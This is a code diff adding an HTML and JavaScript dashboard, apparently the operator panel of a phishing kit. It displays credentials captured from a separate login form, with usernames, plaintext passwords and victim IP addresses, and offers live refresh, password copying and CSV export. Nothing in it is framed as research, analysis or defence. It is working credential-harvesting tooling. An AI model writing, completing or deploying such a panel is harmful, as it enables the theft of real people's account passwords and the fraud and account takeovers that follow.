@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Database Management Dashboard</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0b0f19;
+            --bg-secondary: #121829;
+            --bg-card: rgba(22, 30, 49, 0.7);
+            --border: rgba(255, 255, 255, 0.08);
+            --border-hover: rgba(255, 255, 255, 0.18);
+            --accent: #3b82f6;
+            --accent-hover: #2563eb;
+            --accent-glow: rgba(59, 130, 246, 0.25);
+            --danger: #ef4444;
+            --danger-hover: #dc2626;
+            --success: #10b981;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+            --gold: #f59e0b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.12) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(245, 158, 11, 0.08) 0px, transparent 50%);
+            background-attachment: fixed;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 32px;
+            background: rgba(18, 24, 41, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-badge {
+            background: linear-gradient(135deg, #f59e0b, #ef4444);
+            color: #fff;
+            font-weight: 800;
+            padding: 6px 12px;
+            border-radius: 8px;
+            letter-spacing: 1px;
+            font-size: 14px;
+        }
+
+        .brand h1 {
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            color: #fff;
+        }
+
+        .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 9px 16px;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            border: 1px solid transparent;
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: #fff;
+            box-shadow: 0 0 15px var(--accent-glow);
+        }
+        .btn-primary:hover {
+            background: var(--accent-hover);
+            transform: translateY(-1px);
+        }
+
+        .btn-outline {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-main);
+            border: 1px solid var(--border);
+        }
+        .btn-outline:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: var(--border-hover);
+        }
+
+        .btn-danger {
+            background: rgba(239, 68, 68, 0.15);
+            color: #fca5a5;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+        .btn-danger:hover {
+            background: var(--danger);
+            color: #fff;
+        }
+
+        .main-container {
+            max-width: 1280px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 32px 24px;
+            flex: 1;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 18px;
+            margin-bottom: 28px;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: var(--accent);
+        }
+
+        .stat-card.gold::after { background: var(--gold); }
+        .stat-card.green::after { background: var(--success); }
+
+        .stat-label {
+            font-size: 12px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+
+        .stat-value {
+            font-size: 26px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        /* Controls Section */
+        .toolbar {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px 20px;
+        }
+
+        .search-box {
+            position: relative;
+            flex: 1;
+            min-width: 250px;
+            max-width: 400px;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 10px 14px 10px 38px;
+            background: rgba(11, 15, 25, 0.8);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 13px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .search-box input:focus {
+            border-color: var(--accent);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+
+        .toolbar-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        /* Table Card */
+        .table-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .table-responsive {
+            overflow-x: auto;
+            width: 100%;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: left;
+            font-size: 13px;
+        }
+
+        th {
+            background: rgba(11, 15, 25, 0.95);
+            color: var(--text-muted);
+            font-weight: 600;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.7px;
+            padding: 14px 18px;
+            border-bottom: 1px solid var(--border);
+            white-space: nowrap;
+        }
+
+        td {
+            padding: 14px 18px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            vertical-align: middle;
+        }
+
+        tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .mono {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+        }
+
+        .user-cell {
+            font-weight: 600;
+            color: #60a5fa;
+        }
+
+        .password-badge {
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 4px 8px;
+            border-radius: 6px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .copy-btn {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 12px;
+            transition: color 0.15s;
+        }
+        .copy-btn:hover {
+            color: #fff;
+        }
+
+        .date-cell {
+            color: var(--text-muted);
+            white-space: nowrap;
+        }
+
+        .ip-badge {
+            background: rgba(245, 158, 11, 0.12);
+            color: #fbbf24;
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-size: 11px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--text-muted);
+        }
+        .empty-state h3 {
+            font-size: 16px;
+            margin-bottom: 8px;
+            color: #fff;
+        }
+
+        .action-del {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            color: #f87171;
+            padding: 5px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        .action-del:hover {
+            background: var(--danger);
+            color: #fff;
+        }
+
+        .live-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            margin-right: 6px;
+            box-shadow: 0 0 8px #10b981;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: #1f2937;
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            font-size: 13px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            display: none;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="navbar">
+        <div class="brand">
+            <div class="brand-badge">SQLITE DB</div>
+            <h1>Credentials Vault & Submissions</h1>
+        </div>
+        <div class="nav-actions">
+            <a href="/" class="btn btn-outline" target="_blank">↗ View Landing Page</a>
+            <button class="btn btn-primary" onclick="fetchSubmissions()">🔄 Refresh</button>
+        </div>
+    </header>
+
+    <main class="main-container">
+        <!-- Stats Row -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-label">Total Submissions</div>
+                <div class="stat-value" id="totalCount">0</div>
+            </div>
+            <div class="stat-card gold">
+                <div class="stat-label">Database Status</div>
+                <div class="stat-value" style="font-size: 18px; display: flex; align-items: center;">
+                    <span class="live-indicator"></span> Active & Connected
+                </div>
+            </div>
+            <div class="stat-card green">
+                <div class="stat-label">Storage Engine</div>
+                <div class="stat-value" style="font-size: 18px;">SQLite 3 (Local)</div>
+            </div>
+        </div>
+
+        <!-- Filter & Actions Toolbar -->
+        <div class="toolbar">
+            <div class="search-box">
+                <span class="search-icon">🔍</span>
+                <input type="text" id="searchInput" placeholder="Search by email, password, IP..." onkeyup="filterSubmissions()">
+            </div>
+            <div class="toolbar-actions">
+                <a href="/api/export/csv" class="btn btn-outline">📥 Export to CSV</a>
+                <button class="btn btn-danger" onclick="clearAllData()">🗑️ Clear All Entries</button>
+            </div>
+        </div>
+
+        <!-- Data Table -->
+        <div class="table-card">
+            <div class="table-responsive">
+                <table>
+                    <thead>
+                        <tr>
+                            <th># ID</th>
+                            <th>Email / Username</th>
+                            <th>Password</th>
+                            <th>IP Address</th>
+                            <th>Date & Time</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="submissionsTableBody">
+                        <tr>
+                            <td colspan="6" class="empty-state">
+                                <h3>Loading submissions from database...</h3>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </main>
+
+    <div class="toast" id="toast">Notification message</div>
+
+    <script>
+        let allSubmissions = [];
+
+        async function fetchSubmissions() {
+            try {
+                const response = await fetch('/api/submissions');
+                const result = await response.json();
+                
+                if (result.success) {
+                    allSubmissions = result.data;
+                    document.getElementById('totalCount').innerText = allSubmissions.length;
+                    renderTable(allSubmissions);
+                } else {
+                    showToast('Failed to load submissions: ' + result.message);
+                }
+            } catch (err) {
+                console.error(err);
+                document.getElementById('submissionsTableBody').innerHTML = `
+                    <tr>
+                        <td colspan="6" class="empty-state" style="color: #ef4444;">
+                            <h3>❌ Unable to connect to server API</h3>
+                            <p>Make sure server.js is running (npm start).</p>
+                        </td>
+                    </tr>
+                `;
+            }
+        }
+
+        function renderTable(data) {
+            const tbody = document.getElementById('submissionsTableBody');
+            
+            if (data.length === 0) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="6" class="empty-state">
+                            <h3>No Submissions Found</h3>
+                            <p>When someone enters their details on the login form, they will appear here in real time.</p>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+
+            tbody.innerHTML = data.map(item => {
+                const safeEmail = escapeHtml(item.username);
+                const safePassword = escapeHtml(item.password);
+                const safeIp = escapeHtml(item.ip_address || 'N/A');
+                const safeDate = item.created_at || 'Just now';
+
+                return `
+                    <tr>
+                        <td class="mono" style="color: var(--text-muted);">#${item.id}</td>
+                        <td class="user-cell mono">${safeEmail}</td>
+                        <td>
+                            <div class="password-badge mono">
+                                <span>${safePassword}</span>
+                                <button class="copy-btn" title="Copy Password" onclick="copyToClipboard('${escapeJs(item.password)}')">📋</button>
+                            </div>
+                        </td>
+                        <td><span class="ip-badge mono">${safeIp}</span></td>
+                        <td class="date-cell mono">${safeDate}</td>
+                        <td>
+                            <button class="action-del" onclick="deleteEntry(${item.id})">Delete</button>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        function filterSubmissions() {
+            const query = document.getElementById('searchInput').value.toLowerCase().trim();
+            if (!query) {
+                renderTable(allSubmissions);
+                return;
+            }
+            const filtered = allSubmissions.filter(item => 
+                (item.username && item.username.toLowerCase().includes(query)) ||
+                (item.password && item.password.toLowerCase().includes(query)) ||
+                (item.ip_address && item.ip_address.toLowerCase().includes(query)) ||
+                (item.created_at && item.created_at.toLowerCase().includes(query))
+            );
+            renderTable(filtered);
+        }
+
+        async function deleteEntry(id) {
+            if (!confirm(`Are you sure you want to delete entry #${id}?`)) return;
+
+            try {
+                const res = await fetch(`/api/submissions/${id}`, { method: 'DELETE' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`Entry #${id} deleted.`);
+                    fetchSubmissions();
+                } else {
+                    showToast(`Error: ${data.message}`);
+                }
+            } catch (err) {
+                showToast('Failed to delete entry.');
+            }
+        }
+
+        async function clearAllData() {
+            if (!confirm('⚠️ Are you sure you want to delete ALL entries in the database? This cannot be undone.')) return;
+
+            try {
+                const res = await fetch('/api/submissions', { method: 'DELETE' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('All submissions cleared.');
+                    fetchSubmissions();
+                } else {
+                    showToast(`Error: ${data.message}`);
+                }
+            } catch (err) {
+                showToast('Failed to clear database.');
+            }
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('Password copied to clipboard!');
+            }).catch(() => {
+                showToast('Failed to copy.');
+            });
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.innerText = msg;
+            toast.style.display = 'block';
+            setTimeout(() => { toast.style.display = 'none'; }, 3000);
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        function escapeJs(str) {
+            if (!str) return '';
+            return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+        }
+
+        // Auto fetch on load and every 10 seconds
+        fetchSubmissions();
+        setInterval(fetchSubmissions, 10000);
+    </script>
+</body>
+</html>
